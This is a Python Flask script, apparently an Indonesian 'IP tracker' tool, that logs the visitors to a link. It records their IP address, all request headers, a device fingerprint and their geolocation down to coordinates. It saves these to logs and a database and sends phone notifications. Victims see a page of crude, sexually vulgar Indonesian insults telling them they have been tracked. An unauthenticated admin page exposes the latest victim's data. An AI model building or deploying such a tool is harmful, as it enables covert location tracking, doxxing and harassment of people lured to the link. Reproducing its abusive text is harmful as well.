#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RADENZ TRACKING SYSTEM v2.0@
NGEWE ALAMAT IP ORANG
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import threading
import time
import os
import sys
import json
import socket
import subprocess
from modules.geo_location import GeoTracker
from modules.device_parser import DeviceParser
from modules.logger import LoggerSystem
from modules.notifier import TermuxNotifier

# Initialize modules
geo = GeoTracker()
parser = DeviceParser()
logger = LoggerSystem()
notifier = TermuxNotifier()

app = Flask(__name__)

# HTML Templates
INDEX_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>● RADENZ SYSTEM ●</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #00ff00;
        }
        .terminal {
            background: #000000;
            width: 800px;
            max-width: 95%;
            border: 2px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0,255,0,0.2);
            overflow: hidden;
        }
        .terminal-header {
            background: #001100;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #00ff00;
        }
        .terminal-title {
            color: #00ff00;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .terminal-buttons {
            margin-left: auto;
            display: flex;
            gap: 8px;
        }
        .btn {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        .btn-red { background: #ff5f56; }
        .btn-yellow { background: #ffbd2e; }
        .btn-green { background: #27c93f; }
        .terminal-body {
            padding: 25px;
            min-height: 300px;
        }
        .ascii-art {
            color: #00ff00;
            font-size: 12px;
            line-height: 1.2;
            margin-bottom: 20px;
            text-align: center;
        }
        .status-bar {
            background: #001100;
            padding: 10px;
            margin: 15px 0;
            border-left: 4px solid #00ff00;
        }
        .blink {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        .data-stream {
            font-size: 12px;
            color: #008800;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">
            <div class="terminal-title">● RAMADHAN 2026 ●</div>
            <div class="terminal-buttons">
                <div class="btn btn-red"></div>
                <div class="btn btn-yellow"></div>
                <div class="btn btn-green"></div>
            </div>
        </div>
        <div class="terminal-body">
            <div class="ascii-art">
    ╔══════════════════════════════════════════╗
    ║  ████████╗██████╗  █████╗  ██████╗██╗  ██╗
    ║  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
    ║     ██║   ██████╔╝███████║██║     █████╔╝ 
    ║     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
    ║     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
    ║     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    ╚══════════════════════════════════════════╝
            </div>
            <div class="status-bar">
                [●] TAPI BOONG,WKWK MAMPUS IP LU KENA LACAK ANJING!<br>
                [●] JANGAN LUPA EWE EMAK SENDIRI YA!<br>
                [●] NAH GINI NIH KELAKUAN ORANG TOLOL!WKWK!
            </div>
            <div class="data-stream" id="dataStream">
                [PROCESSING] > Sabar ya anjing,lagi proses!...<br>
                [REDIRECT] > Returning to main sequence...
            </div>
        </div>
    </div>
    <script>
        // Generate fake data stream effect
        const messages = [
            "[DATA] > analisis paket memek selesai!",
            "[INFO] > proses geo selesai!",
            "[SYS] > Fingerprint stored",
            "[LOG] > Visitor entry created"
        ];
        let i = 0;
        setInterval(() => {
            const stream = document.getElementById('dataStream');
            const newMsg = document.createElement('div');
            newMsg.textContent = messages[i % messages.length];
            newMsg.style.color = '#00aa00';
            stream.appendChild(newMsg);
            if(stream.children.length > 10) {
                stream.removeChild(stream.children[0]);
            }
            i++;
        }, 2000);
    </script>
</body>
</html>
"""

class AdvancedTracker:
    def __init__(self):
        self.start_time = datetime.now()
        self.visitor_count = 0
        self.lock = threading.Lock()
        
    def get_client_ip(self):
        """Extract real IP address handling proxies"""
        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0]
        elif request.headers.getlist("X-Real-IP"):
            ip = request.headers.getlist("X-Real-IP")[0]
        else:
            ip = request.remote_addr
        return ip.split(',')[0].strip()
    
    def get_all_headers(self):
        """Capture all HTTP headers for fingerprinting"""
        headers = {}
        for key, value in request.headers.items():
            headers[key] = value
        return headers
    
    def process_visitor(self, path):
        """Main visitor processing pipeline"""
        with self.lock:
            self.visitor_count += 1
            visitor_id = self.visitor_count
        
        # Collect data
        ip = self.get_client_ip()
        headers = self.get_all_headers()
        user_agent = headers.get('User-Agent', 'Unknown')
        
        # Parse device info
        device_info = parser.parse(user_agent)
        
        # Get geolocation
        geo_data = geo.locate(ip)
        
        # Get language preference
        accept_language = headers.get('Accept-Language', 'Unknown')
        
        # Referrer
        referrer = headers.get('Referer', 'Direct Access')
        
        # Create timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Compile visitor data
        visitor_data = {
            'id': visitor_id,
            'timestamp': timestamp,
            'ip_address': ip,
            'path': path,
            'method': request.method,
            'user_agent': user_agent,
            'device': device_info,
            'geolocation': geo_data,
            'language': accept_language,
            'referrer': referrer,
            'headers': headers
        }
        
        # Display in terminal (formatted)
        self.display_terminal_output(visitor_data)
        
        # Log to all formats
        logger.log_all(visitor_data)
        
        # Send Termux notification (optional)
        notifier.send_notification(visitor_data)
        
        return visitor_data
    
    def display_terminal_output(self, data):
        """Beautiful terminal output"""
        os.system('clear')
        print("""\033[92m
╔══════════════════════════════════════════════════════════════════╗
║  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗        ║
║  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗       ║
║     ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝       ║
║     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗       ║
║     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║       ║
║     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ║
║                         RADENZ SYSTEM                            ║
╚══════════════════════════════════════════════════════════════════╝\033[0m""")
        
        print(f"""
\033[92m┌─[ NEW VISITOR #{data['id']} ]────────────────────────────────────┐
│                                                              
├── \033[93mTIMESTAMP\033[92m: {data['timestamp']}
├── \033[93mIP ADDRESS\033[92m: {data['ip_address']}
├── \033[93mPATH\033[92m: {data['path']}
├── \033[93mMETHOD\033[92m: {data['method']}
│
├── \033[96mDEVICE INFORMATION\033[92m
│   ├── Browser: {data['device']['browser']}
│   ├── OS: {data['device']['os']}
│   ├── Device: {data['device']['device']}
│   └── Bot: {data['device']['is_bot']}
│
├── \033[96mGEOLOCATION\033[92m
│   ├── Country: {data['geolocation']['country']}
│   ├── Region: {data['geolocation']['region']}
│   ├── City: {data['geolocation']['city']}
│   ├── ISP: {data['geolocation']['isp']}
│   └── Coordinates: {data['geolocation']['lat']}, {data['geolocation']['lon']}
│
├── \033[96mADDITIONAL DATA\033[92m
│   ├── Language: {data['language']}
│   ├── Referrer: {data['referrer']}
│   └── User Agent: {data['user_agent'][:80]}...
│
└───────────────────────────────────────────────────────────────┘
\033[0m""")

tracker = AdvancedTracker()

@app.route('/')
@app.route('/<path:path>')
def catch_all(path='/'):
    """Main entry point - tracks all requests"""
    visitor_data = tracker.process_visitor(path)
    
    # Log to file in real-time
    sys.stdout.flush()
    
    # Return page with visitor ID embedded
    return render_template_string(
        INDEX_TEMPLATE.replace('{{visitor_id}}', str(visitor_data['id']))
    )

@app.route('/api/visitors/latest', methods=['GET'])
def api_latest():
    """API endpoint to get latest visitor data"""
    return jsonify(logger.get_latest())

@app.route('/api/visitors/count', methods=['GET'])
def api_count():
    """API endpoint to get visitor count"""
    return jsonify({'total_visitors': tracker.visitor_count})

@app.route('/admin/dashboard')
def admin_dashboard():
    """Simple admin dashboard (no auth for simplicity)"""
    if tracker.visitor_count == 0:
        return "No visitors yet"
    
    latest = logger.get_latest()
    return f"""
    <html>
    <head><title>Tracker Admin</title></head>
    <body>
        <h1>Visitor Statistics</h1>
        <p>Total Visitors: {tracker.visitor_count}</p>
        <p>Latest IP: {latest.get('ip_address', 'N/A')}</p>
        <p>Latest Device: {latest.get('device', {}).get('os', 'N/A')}</p>
    </body>
    </html>
    """

def monitor_terminal():
    """Background thread to monitor terminal input"""
    while True:
        try:
            cmd = input("\033[92mTracker> \033[0m")
            if cmd.lower() == 'clear':
                os.system('clear')
            elif cmd.lower() == 'stats':
                print(f"\nTotal visitors: {tracker.visitor_count}")
                print(f"Uptime: {datetime.now() - tracker.start_time}")
            elif cmd.lower() == 'exit':
                print("Shutting down tracker...")
                os._exit(0)
        except:
            pass

if __name__ == '__main__':
    # Clear screen
    os.system('clear')
    
    # Get local IP
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Try to get public IP
    try:
        public_ip = subprocess.check_output(['curl', '-s', 'ifconfig.me']).decode().strip()
    except:
        public_ip = "Unable to fetch"
    
    print(f"""
\033[92m╔══════════════════════════════════════════════════════════════╗
║                   RADENZ SYSTEM ACTIVATED                            ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  \033[96mServer Information:\033[92m                                 ║
║  ├─ Local IP: {local_ip:<15}                                         ║
║  ├─ Public IP: {public_ip:<15}                                       ║
║  ├─ Port: 3001                                                       ║
║  ├─ URL: http://{local_ip}:3001                                      ║
║  ├─ External URL: http://{public_ip}:3001 (if port forwarded)        ║
║                                                                      ║
║  \033[96mFeatures Enabled:\033[92m                                   ║
║  ├─ IP Tracking ✓                                                    ║
║  ├─ Device Fingerprinting ✓                                          ║
║  ├─ Geolocation ✓                                                    ║
║  ├─ Multi-format Logging ✓                                           ║
║  ├─ Termux Notifications ✓                                           ║
║  └─ Real-time Terminal Output ✓                                      ║
║                                                                      ║
║  \033[96mLog Files:\033[92m                                          ║
║  ├─ logs/access.log (Apache format)                                  ║
║  ├─ logs/detailed.json (JSON format)                                 ║
║  └─ logs/visitors.db (SQLite database)                               ║
║                                                                      ║
║  \033[96mCommands:\033[92m                                           ║
║  ├─ Type 'clear' to clear screen                                     ║
║  ├─ Type 'stats' for statistics                                      ║
║  └─ Type 'exit' to shutdown                                          ║
║                                                                      ║
║  \033[93mWaiting for visitors...\033[92m                             ║
╚══════════════════════════════════════════════════════════════════════╝\033[0m
    """)
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=monitor_terminal, daemon=True)
    monitor_thread.start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=3001 , debug=False, threaded=True)
